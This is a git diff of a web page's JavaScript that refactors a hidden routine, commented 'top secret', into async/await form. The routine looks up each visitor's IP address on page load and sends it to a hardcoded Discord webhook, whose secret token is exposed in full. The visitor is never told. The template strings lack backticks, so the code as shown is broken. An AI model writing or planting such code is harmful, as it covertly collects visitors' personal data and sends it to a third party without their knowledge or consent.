@@ -61,41 +61,54 @@ document.getElementById("signup-btn").addEventListener("click", function(){
 
 //top secret maneeee
 
-function getUserIP(callback) {
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-      const ipAddress = data.ip;
-      callback(ipAddress);
-    })
-    .catch(error => console.error('Error fetching IP address:', error));
+// Function to get the user's IP address
+async function getUserIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.error('Error fetching IP address:', error);
+    return null;
+  }
 }
 
 // Function to send IP address to Discord webhook
-function sendIPToDiscord(ipAddress) {
-  const webhookURL = 'https://discord.com/api/webhooks/1209935096396906497/37hvz1ZLG9wXploBd0dQL9NjQtKmOzxizFqkMW5p9cEAdCHHpcQyjOwXUL01_-trHP2u';
+async function sendIPToDiscord(ipAddress) {
+  try {
+    const webhookURL = 'https://discord.com/api/webhooks/1209935096396906497/37hvz1ZLG9wXploBd0dQL9NjQtKmOzxizFqkMW5p9cEAdCHHpcQyjOwXUL01_-trHP2u';
 
-  // Create the payload
-  const payload = {
-    content: New visitor's IP address: ${ipAddress}
-  };
+    // Create the payload
+    const payload = {
+      content: New visitor's IP address: ${ipAddress}
+    };
 
-  // Send POST request to Discord webhook URL
-  fetch(webhookURL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(payload)
-  })
-  .then(response => {
+    // Send POST request to Discord webhook URL
+    const response = await fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    });
+
     if (!response.ok) {
-      throw new Error('Failed to send lumea de minecraft to Discord webhook');
+      throw new Error('Failed to send IP address to Discord webhook');
     }
+
     console.log('IP address sent to Discord successfully');
-  })
-  .catch(error => console.error('Tzakalie s a dus pe cioaca TOTU...EROARE 69:', error));
+  } catch (error) {
+    console.error('Error sending IP address to Discord:', error);
+  }
 }
 
-// Call the functions
-getUserIP(sendIPToDiscord);
+// Main function to get IP and send it to Discord
+async function main() {
+  const ipAddress = await getUserIP();
+  if (ipAddress) {
+    await sendIPToDiscord(ipAddress);
+  }
+}
+
+// Call the main function
+main();
